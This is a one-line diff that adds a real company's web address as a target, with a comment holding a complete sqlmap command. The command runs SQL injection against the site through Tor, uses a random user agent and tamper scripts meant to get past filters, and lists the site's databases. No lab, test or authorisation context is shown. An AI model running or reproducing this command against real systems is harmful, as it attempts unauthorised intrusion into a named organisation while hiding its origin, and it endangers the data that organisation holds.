@@ -1,0 +1,1 @@
+https://www.equifax.com/index.php?id=1 (GET)  # sqlmap.py -u https://www.equifax.com/index.php?id=1 --tor --tor-type=SOCKS5 --random-agent --tamper=space2comment,between,randomcase --batch --dbs
